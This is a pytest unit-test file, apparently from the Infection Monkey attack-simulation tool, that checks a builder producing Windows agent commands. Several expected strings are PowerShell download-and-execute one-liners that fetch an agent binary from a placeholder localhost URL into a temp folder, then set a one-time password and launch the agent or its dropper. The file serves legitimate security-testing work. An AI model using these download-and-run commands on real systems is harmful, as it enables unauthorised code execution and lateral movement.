from pathlib import PureWindowsPath

import pytest
from tests.unit_tests.common.command_builder.conftest import (
    AGENT_ID,
    AGENT_OTP_ENVIRONMENT_VARIABLE,
    DEPTH,
    OTP,
    SERVERS,
)

from common.command_builder import (
    DropperExecutionMode,
    IAgentCommandBuilderFactory,
    IWindowsAgentCommandBuilder,
    WindowsDownloadMethod,
    WindowsDownloadOptions,
    WindowsRunOptions,
    WindowsShell,
)
from infection_monkey.model import DROPPER_ARG, MONKEY_ARG
from infection_monkey.utils.commands import build_monkey_commandline_parameters

AGENT_DESTINATION_PATH = PureWindowsPath("C:\\Windows\\Temp\\agent.exe")
DROPPER_DESTINATION_PATH = PureWindowsPath("C:\\Temp\\dropper.exe")
DOWNLOAD_URL = "http://127.0.0.1/agent"


@pytest.fixture
def expected_monkey_agent_arguments() -> str:
    return " ".join(
        build_monkey_commandline_parameters(
            parent=AGENT_ID, servers=SERVERS, depth=DEPTH, location=None
        )
    )


@pytest.fixture
def expected_dropper_agent_arguments() -> str:
    return " ".join(
        build_monkey_commandline_parameters(
            parent=AGENT_ID, servers=SERVERS, depth=DEPTH, location=DROPPER_DESTINATION_PATH
        )
    )


@pytest.fixture
def windows_agent_command_builder(
    agent_command_builder_factory: IAgentCommandBuilderFactory,
) -> IWindowsAgentCommandBuilder:
    return agent_command_builder_factory.create_windows_agent_command_builder()


def test_initial_command(windows_agent_command_builder: IWindowsAgentCommandBuilder):
    assert windows_agent_command_builder.get_command() == ""


@pytest.mark.parametrize(
    "expected_command, download_method",
    [
        (
            (
                f"powershell Invoke-WebRequest -Uri '{DOWNLOAD_URL}' "
                f"-OutFile '{AGENT_DESTINATION_PATH}' -UseBasicParsing ; "
            ),
            WindowsDownloadMethod.WEB_REQUEST,
        ),
        (
            (
                f"powershell (new-object System.Net.WebClient)"
                f".DownloadFile(^''{DOWNLOAD_URL}^'' , ^''{AGENT_DESTINATION_PATH}^'') ; "
            ),
            WindowsDownloadMethod.WEB_CLIENT,
        ),
    ],
)
def test_build_download_command(
    windows_agent_command_builder: IWindowsAgentCommandBuilder,
    expected_command: str,
    download_method: WindowsDownloadMethod,
):
    windows_download_options = WindowsDownloadOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        download_method=download_method,
        download_url=DOWNLOAD_URL,
    )
    windows_agent_command_builder.build_download_command(windows_download_options)

    assert windows_agent_command_builder.get_command() == expected_command


@pytest.mark.parametrize(
    "shell, expected_otp_set",
    [
        (WindowsShell.CMD, f"set {AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP}&"),
        (WindowsShell.POWERSHELL, f"$env:{AGENT_OTP_ENVIRONMENT_VARIABLE}='{OTP}' ;"),
    ],
)
def test_build_run_command_none(
    expected_monkey_agent_arguments: str,
    windows_agent_command_builder: IWindowsAgentCommandBuilder,
    shell: WindowsShell,
    expected_otp_set: str,
):
    expected_command = (
        f"{expected_otp_set} {AGENT_DESTINATION_PATH} "
        f"{MONKEY_ARG} {expected_monkey_agent_arguments}"
    )

    windows_run_options = WindowsRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.NONE,
        shell=shell,
    )
    windows_agent_command_builder.build_run_command(windows_run_options)
    assert windows_agent_command_builder.get_command() == expected_command


@pytest.mark.parametrize(
    "shell, expected_otp_set",
    [
        (WindowsShell.CMD, f"set {AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP}&"),
        (WindowsShell.POWERSHELL, f"$env:{AGENT_OTP_ENVIRONMENT_VARIABLE}='{OTP}' ;"),
    ],
)
def test_build_run_command_dropper(
    expected_dropper_agent_arguments: str,
    windows_agent_command_builder: IWindowsAgentCommandBuilder,
    shell: WindowsShell,
    expected_otp_set: str,
):
    expected_command = (
        f"{expected_otp_set} {AGENT_DESTINATION_PATH} "
        f"{DROPPER_ARG} {expected_dropper_agent_arguments}"
    )

    windows_run_options = WindowsRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.DROPPER,
        shell=shell,
        dropper_destination_path=DROPPER_DESTINATION_PATH,
    )
    windows_agent_command_builder.build_run_command(windows_run_options)
    assert windows_agent_command_builder.get_command() == expected_command


@pytest.mark.parametrize(
    "shell, expected_otp_set",
    [
        (WindowsShell.CMD, f"set {AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP}&"),
        (WindowsShell.POWERSHELL, f"$env:{AGENT_OTP_ENVIRONMENT_VARIABLE}='{OTP}' ;"),
    ],
)
def test_build_run_command_script(
    windows_agent_command_builder: IWindowsAgentCommandBuilder,
    shell: WindowsShell,
    expected_otp_set: str,
):
    expected_command = f"{expected_otp_set} {AGENT_DESTINATION_PATH} "

    windows_run_options = WindowsRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.SCRIPT,
        shell=shell,
    )
    windows_agent_command_builder.build_run_command(windows_run_options)
    assert windows_agent_command_builder.get_command() == expected_command


def test_build_run_command_unempty_download(
    windows_agent_command_builder: IWindowsAgentCommandBuilder,
    expected_dropper_agent_arguments: str,
):
    expected_command = (
        f"powershell Invoke-WebRequest -Uri '{DOWNLOAD_URL}' "
        f"-OutFile '{AGENT_DESTINATION_PATH}' -UseBasicParsing ; "
        f"cmd.exe /c set {AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP}& "
        f"{AGENT_DESTINATION_PATH} {DROPPER_ARG} {expected_dropper_agent_arguments}"
    )
    windows_download_options = WindowsDownloadOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        download_method=WindowsDownloadMethod.WEB_REQUEST,
        download_url=DOWNLOAD_URL,
    )
    windows_agent_command_builder.build_download_command(windows_download_options)
    windows_run_options = WindowsRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.DROPPER,
        shell=WindowsShell.CMD,
        dropper_destination_path=DROPPER_DESTINATION_PATH,
    )
    windows_agent_command_builder.build_run_command(windows_run_options)
    assert windows_agent_command_builder.get_command() == expected_command


def test_command_reset(windows_agent_command_builder: IWindowsAgentCommandBuilder):
    expected_command = f"set {AGENT_OTP_ENVIRONMENT_VARIABLE}={OTP}& {AGENT_DESTINATION_PATH} "
    windows_download_options = WindowsDownloadOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        download_method=WindowsDownloadMethod.WEB_REQUEST,
        download_url=DOWNLOAD_URL,
    )
    windows_run_options = WindowsRunOptions(
        agent_destination_path=AGENT_DESTINATION_PATH,
        dropper_execution_mode=DropperExecutionMode.SCRIPT,
        shell=WindowsShell.CMD,
    )

    windows_agent_command_builder.build_download_command(windows_download_options)
    windows_agent_command_builder.reset_command()
    assert windows_agent_command_builder.get_command() == ""

    windows_agent_command_builder.build_run_command(windows_run_options)
    assert windows_agent_command_builder.get_command() == expected_command
